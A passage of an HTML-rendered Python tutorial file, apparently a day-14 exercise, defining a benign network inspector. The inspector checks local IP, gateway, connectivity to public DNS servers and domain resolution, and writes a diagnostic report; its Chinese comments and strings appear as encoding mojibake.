class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day14_network_inspector.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šç»¼åˆç½‘ç»œé…ç½®æ£€æµ‹å·¥å…·</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> platform<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkInspector</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ç½‘ç»œé…ç½®æ£€æµ‹å·¥å…·</span><br><span class="hljs-string"></span><br><span class="hljs-string">    åŠŸèƒ½ï¼š</span><br><span class="hljs-string">        1. è·å–æœ¬æœºç½‘ç»œé…ç½®</span><br><span class="hljs-string">        2. æµ‹è¯•ç½‘ç»œè¿é€šæ€§</span><br><span class="hljs-string">        3. DNSè§£ææµ‹è¯•</span><br><span class="hljs-string">        4. ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.system = platform.system()<br>        <span class="hljs-variable language_">self</span>.report = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_to_report</span>(<span class="hljs-params">self, section: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ·»åŠ å†…å®¹åˆ°æŠ¥å‘Š&quot;&quot;&quot;</span><br>        <span class="hljs-variable language_">self</span>.report.append(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.report.append(<span class="hljs-string">f&quot; <span class="hljs-subst">&#123;section&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.report.append(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-variable language_">self</span>.report.append(content)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        è·å–æœ¬æœºIPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›å€¼ï¼š</span><br><span class="hljs-string">            æœ¬æœºIPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">            åˆ›å»ºUDP socketè¿æ¥åˆ°å¤–éƒ¨åœ°å€ï¼ˆä¸å®é™…å‘é€æ•°æ®ï¼‰</span><br><span class="hljs-string">            ä»socketè·å–æœ¬æœºä½¿ç”¨çš„IPåœ°å€</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># åˆ›å»ºUDP socket</span><br>            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>            <span class="hljs-comment"># è¿æ¥åˆ°å¤–éƒ¨åœ°å€ï¼ˆGoogle DNSï¼‰</span><br>            s.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br>            <span class="hljs-comment"># è·å–socketä½¿ç”¨çš„æœ¬åœ°IP</span><br>            local_ip = s.getsockname()[<span class="hljs-number">0</span>]<br>            s.close()<br>            <span class="hljs-keyword">return</span> local_ip<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;è·å–å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hostname</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;è·å–ä¸»æœºå&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> socket.gethostname()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_network_interfaces</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        è·å–ç½‘ç»œæ¥å£ä¿¡æ¯</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›å€¼ï¼š</span><br><span class="hljs-string">            åŒ…å«æ¥å£ä¿¡æ¯çš„å­—å…¸</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        interfaces = &#123;&#125;<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># è·å–ä¸»æœºåå¯¹åº”çš„æ‰€æœ‰IPåœ°å€</span><br>            hostname = socket.gethostname()<br>            local_ips = socket.gethostbyname_ex(hostname)[<span class="hljs-number">2</span>]<br><br>            interfaces[<span class="hljs-string">&#x27;ä¸»æœºå&#x27;</span>] = hostname<br>            interfaces[<span class="hljs-string">&#x27;æœ¬æœºIP&#x27;</span>] = <span class="hljs-variable language_">self</span>.get_local_ip()<br>            interfaces[<span class="hljs-string">&#x27;æ‰€æœ‰IP&#x27;</span>] = <span class="hljs-string">&#x27;, &#x27;</span>.join(local_ips)<br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            interfaces[<span class="hljs-string">&#x27;é”™è¯¯&#x27;</span>] = <span class="hljs-built_in">str</span>(e)<br><br>        <span class="hljs-keyword">return</span> interfaces<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_connectivity</span>(<span class="hljs-params">self, host: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8.8.8.8&quot;</span>, port: <span class="hljs-built_in">int</span> = <span class="hljs-number">53</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æµ‹è¯•ç½‘ç»œè¿é€šæ€§</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            host: ç›®æ ‡ä¸»æœº</span><br><span class="hljs-string">            port: ç›®æ ‡ç«¯å£</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›å€¼ï¼š</span><br><span class="hljs-string">            (æ˜¯å¦è¿é€š, è¯¦ç»†ä¿¡æ¯)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># å°è¯•å»ºç«‹TCPè¿æ¥</span><br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(<span class="hljs-number">3</span>)<br>            start_time = socket.time.time()<br>            result = sock.connect_ex((host, port))<br>            end_time = socket.time.time()<br>            sock.close()<br><br>            <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>                latency = (end_time - start_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># è½¬æ¢ä¸ºæ¯«ç§’</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">f&quot;âœ… è¿æ¥æˆåŠŸ (<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>) - å»¶è¿Ÿ: <span class="hljs-subst">&#123;latency:<span class="hljs-number">.2</span>f&#125;</span>ms&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;âŒ è¿æ¥å¤±è´¥ (<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>)&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;âŒ è¿æ¥å¼‚å¸¸: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_dns</span>(<span class="hljs-params">self, domain: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;www.baidu.com&quot;</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æµ‹è¯•DNSè§£æ</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            domain: è¦è§£æçš„åŸŸå</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›å€¼ï¼š</span><br><span class="hljs-string">            (æ˜¯å¦æˆåŠŸ, è¯¦ç»†ä¿¡æ¯)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = socket.time.time()<br>            ip = socket.gethostbyname(domain)<br>            end_time = socket.time.time()<br><br>            query_time = (end_time - start_time) * <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">f&quot;âœ… DNSè§£ææˆåŠŸ\n   <span class="hljs-subst">&#123;domain&#125;</span> â†’ <span class="hljs-subst">&#123;ip&#125;</span>\n   æŸ¥è¯¢æ—¶é—´: <span class="hljs-subst">&#123;query_time:<span class="hljs-number">.2</span>f&#125;</span>ms&quot;</span><br>        <span class="hljs-keyword">except</span> socket.gaierror <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;âŒ DNSè§£æå¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;âŒ DNSæŸ¥è¯¢å¼‚å¸¸: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_default_gateway</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        è·å–é»˜è®¤ç½‘å…³</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›å€¼ï¼š</span><br><span class="hljs-string">            é»˜è®¤ç½‘å…³IPåœ°å€</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.system == <span class="hljs-string">&quot;Windows&quot;</span>:<br>                result = subprocess.run(<br>                    [<span class="hljs-string">&#x27;ipconfig&#x27;</span>],<br>                    capture_output=<span class="hljs-literal">True</span>,<br>                    text=<span class="hljs-literal">True</span><br>                )<br>                output = result.stdout<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;é»˜è®¤ç½‘å…³&#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;Default Gateway&#x27;</span> <span class="hljs-keyword">in</span> line:<br>                        parts = line.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">1</span>:<br>                            gateway = parts[<span class="hljs-number">1</span>].strip()<br>                            <span class="hljs-keyword">if</span> gateway <span class="hljs-keyword">and</span> gateway != <span class="hljs-string">&#x27;&#x27;</span>:<br>                                <span class="hljs-keyword">return</span> gateway<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># Linux/Mac</span><br>                result = subprocess.run(<br>                    [<span class="hljs-string">&#x27;ip&#x27;</span>, <span class="hljs-string">&#x27;route&#x27;</span>],<br>                    capture_output=<span class="hljs-literal">True</span>,<br>                    text=<span class="hljs-literal">True</span><br>                )<br>                output = result.stdout<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;default&#x27;</span> <span class="hljs-keyword">in</span> line:<br>                        parts = line.split()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">2</span>:<br>                            <span class="hljs-keyword">return</span> parts[<span class="hljs-number">2</span>]<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æœªæ‰¾åˆ°&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;è·å–å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_full_inspection</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        è¿è¡Œå®Œæ•´çš„ç½‘ç»œæ£€æµ‹</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å·¥ä½œæµç¨‹ï¼š</span><br><span class="hljs-string">            1. è·å–æœ¬æœºç½‘ç»œé…ç½®</span><br><span class="hljs-string">            2. æµ‹è¯•æœ¬åœ°è¿é€šæ€§</span><br><span class="hljs-string">            3. æµ‹è¯•å¤–ç½‘è¿é€šæ€§</span><br><span class="hljs-string">            4. æµ‹è¯•DNSè§£æ</span><br><span class="hljs-string">            5. ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; ç½‘ç»œé…ç½®æ£€æµ‹å·¥å…· - Network Inspector&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><br>        <span class="hljs-comment"># 1. æœ¬æœºé…ç½®</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[1/5] æ­£åœ¨è·å–æœ¬æœºç½‘ç»œé…ç½®...&quot;</span>)<br>        interfaces = <span class="hljs-variable language_">self</span>.get_network_interfaces()<br>        gateway = <span class="hljs-variable language_">self</span>.get_default_gateway()<br><br>        config_info = []<br>        config_info.append(<span class="hljs-string">f&quot;ä¸»æœºå:    <span class="hljs-subst">&#123;interfaces.get(<span class="hljs-string">&#x27;ä¸»æœºå&#x27;</span>, <span class="hljs-string">&#x27;æœªçŸ¥&#x27;</span>)&#125;</span>&quot;</span>)<br>        config_info.append(<span class="hljs-string">f&quot;æœ¬æœºIP:    <span class="hljs-subst">&#123;interfaces.get(<span class="hljs-string">&#x27;æœ¬æœºIP&#x27;</span>, <span class="hljs-string">&#x27;æœªçŸ¥&#x27;</span>)&#125;</span>&quot;</span>)<br>        config_info.append(<span class="hljs-string">f&quot;é»˜è®¤ç½‘å…³:  <span class="hljs-subst">&#123;gateway&#125;</span>&quot;</span>)<br>        config_info.append(<span class="hljs-string">f&quot;æ“ä½œç³»ç»Ÿ:  <span class="hljs-subst">&#123;self.system&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;æœ¬æœºç½‘ç»œé…ç½®&quot;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>.join(config_info))<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> config_info:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;line&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 2. æµ‹è¯•ç½‘å…³è¿é€šæ€§</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[2/5] æ­£åœ¨æµ‹è¯•ç½‘å…³è¿é€šæ€§...&quot;</span>)<br>        <span class="hljs-keyword">if</span> gateway != <span class="hljs-string">&quot;æœªæ‰¾åˆ°&quot;</span> <span class="hljs-keyword">and</span> gateway != <span class="hljs-string">&quot;è·å–å¤±è´¥&quot;</span>:<br>            success, msg = <span class="hljs-variable language_">self</span>.test_connectivity(gateway, <span class="hljs-number">80</span>)<br>            <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;ç½‘å…³è¿é€šæ€§æµ‹è¯•&quot;</span>, msg)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg = <span class="hljs-string">&quot;âŒ æ— æ³•è·å–ç½‘å…³ï¼Œè·³è¿‡æµ‹è¯•&quot;</span><br>            <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;ç½‘å…³è¿é€šæ€§æµ‹è¯•&quot;</span>, msg)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 3. æµ‹è¯•å¤–ç½‘è¿é€šæ€§</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[3/5] æ­£åœ¨æµ‹è¯•å¤–ç½‘è¿é€šæ€§...&quot;</span>)<br>        test_hosts = [<br>            (<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">53</span>, <span class="hljs-string">&quot;Google DNS&quot;</span>),<br>            (<span class="hljs-string">&quot;114.114.114.114&quot;</span>, <span class="hljs-number">53</span>, <span class="hljs-string">&quot;114 DNS&quot;</span>),<br>            (<span class="hljs-string">&quot;1.1.1.1&quot;</span>, <span class="hljs-number">53</span>, <span class="hljs-string">&quot;Cloudflare DNS&quot;</span>)<br>        ]<br><br>        connectivity_results = []<br>        <span class="hljs-keyword">for</span> host, port, name <span class="hljs-keyword">in</span> test_hosts:<br>            success, msg = <span class="hljs-variable language_">self</span>.test_connectivity(host, port)<br>            connectivity_results.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;name&#125;</span>: <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;å¤–ç½‘è¿é€šæ€§æµ‹è¯•&quot;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>.join(connectivity_results))<br><br>        <span class="hljs-comment"># 4. æµ‹è¯•DNS</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[4/5] æ­£åœ¨æµ‹è¯•DNSè§£æ...&quot;</span>)<br>        test_domains = [<br>            <span class="hljs-string">&quot;www.baidu.com&quot;</span>,<br>            <span class="hljs-string">&quot;www.google.com&quot;</span>,<br>            <span class="hljs-string">&quot;www.github.com&quot;</span><br>        ]<br><br>        dns_results = []<br>        <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> test_domains:<br>            success, msg = <span class="hljs-variable language_">self</span>.test_dns(domain)<br>            dns_results.append(msg)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;DNSè§£ææµ‹è¯•&quot;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>.join(dns_results))<br><br>        <span class="hljs-comment"># 5. ç”Ÿæˆè¯Šæ–­å»ºè®®</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[5/5] æ­£åœ¨ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š...&quot;</span>)<br>        diagnosis = <span class="hljs-variable language_">self</span>.generate_diagnosis()<br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;è¯Šæ–­å»ºè®®&quot;</span>, diagnosis)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_diagnosis</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        ç”Ÿæˆè¯Šæ–­å»ºè®®</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›å€¼ï¼š</span><br><span class="hljs-string">            è¯Šæ–­å»ºè®®å­—ç¬¦ä¸²</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        suggestions = []<br><br>        <span class="hljs-comment"># æ£€æŸ¥æŠ¥å‘Šä¸­çš„é—®é¢˜</span><br>        report_text = <span class="hljs-string">&#x27;\n&#x27;</span>.join(<span class="hljs-variable language_">self</span>.report)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;è¿æ¥å¤±è´¥&#x27;</span> <span class="hljs-keyword">in</span> report_text <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;è¿æ¥å¼‚å¸¸&#x27;</span> <span class="hljs-keyword">in</span> report_text:<br>            suggestions.append(<span class="hljs-string">&quot;âš ï¸  æ£€æµ‹åˆ°ç½‘ç»œè¿æ¥é—®é¢˜ï¼š&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   1. æ£€æŸ¥ç½‘çº¿æˆ–WiFiè¿æ¥&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   2. æ£€æŸ¥é˜²ç«å¢™è®¾ç½®&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   3. å°è¯•é‡å¯è·¯ç”±å™¨&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;DNSè§£æå¤±è´¥&#x27;</span> <span class="hljs-keyword">in</span> report_text:<br>            suggestions.append(<span class="hljs-string">&quot;\nâš ï¸  æ£€æµ‹åˆ°DNSè§£æé—®é¢˜ï¼š&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   1. æ£€æŸ¥DNSæœåŠ¡å™¨é…ç½®&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   2. å°è¯•ä½¿ç”¨å…¬å…±DNS (8.8.8.8)&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   3. æ¸…é™¤DNSç¼“å­˜&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> suggestions:<br>            suggestions.append(<span class="hljs-string">&quot;âœ… ç½‘ç»œçŠ¶æ€è‰¯å¥½ï¼Œæœªå‘ç°æ˜æ˜¾é—®é¢˜&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\n&#x27;</span>.join(suggestions)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_report</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ‰“å°å®Œæ•´æŠ¥å‘Š&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; å®Œæ•´è¯Šæ–­æŠ¥å‘Š&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><br>        <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.report:<br>            <span class="hljs-built_in">print</span>(section)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; æŠ¥å‘Šç»“æŸ&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span> + <span class="hljs-string">&quot;\n&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_report</span>(<span class="hljs-params">self, filename: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;network_report.txt&quot;</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        ä¿å­˜æŠ¥å‘Šåˆ°æ–‡ä»¶</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            filename: ä¿å­˜çš„æ–‡ä»¶å</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-string">&quot;ç½‘ç»œé…ç½®æ£€æµ‹æŠ¥å‘Š\n&quot;</span>)<br>                f.write(<span class="hljs-string">f&quot;ç”Ÿæˆæ—¶é—´: <span class="hljs-subst">&#123;socket.time.ctime()&#125;</span>\n&quot;</span>)<br>                f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(<span class="hljs-variable language_">self</span>.report))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâœ… æŠ¥å‘Šå·²ä¿å­˜åˆ°: <span class="hljs-subst">&#123;filename&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâŒ ä¿å­˜æŠ¥å‘Šå¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;ä¸»ç¨‹åº&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</span><br><span class="hljs-string">    â•‘       ç½‘ç»œé…ç½®æ£€æµ‹å·¥å…· v1.0                               â•‘</span><br><span class="hljs-string">    â•‘       Network Configuration Inspector                    â•‘</span><br><span class="hljs-string">    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    inspector = NetworkInspector()<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># è¿è¡Œå®Œæ•´æ£€æµ‹</span><br>        inspector.run_full_inspection()<br><br>        <span class="hljs-comment"># æ‰“å°æŠ¥å‘Š</span><br>        inspector.print_report()<br><br>        <span class="hljs-comment"># ä¿å­˜æŠ¥å‘Š</span><br>        save_option = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\næ˜¯å¦ä¿å­˜æŠ¥å‘Šåˆ°æ–‡ä»¶ï¼Ÿ(y/n): &quot;</span>).strip().lower()<br>        <span class="hljs-keyword">if</span> save_option == <span class="hljs-string">&#x27;y&#x27;</span>:<br>            filename = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æ–‡ä»¶å (é»˜è®¤: network_report.txt): &quot;</span>).strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename:<br>                filename = <span class="hljs-string">&quot;network_report.txt&quot;</span><br>            inspector.save_report(filename)<br><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\nç”¨æˆ·ä¸­æ–­ç¨‹åº&quot;</span>)<br>        sys.exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâŒ ç¨‹åºå¼‚å¸¸: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br><br><span 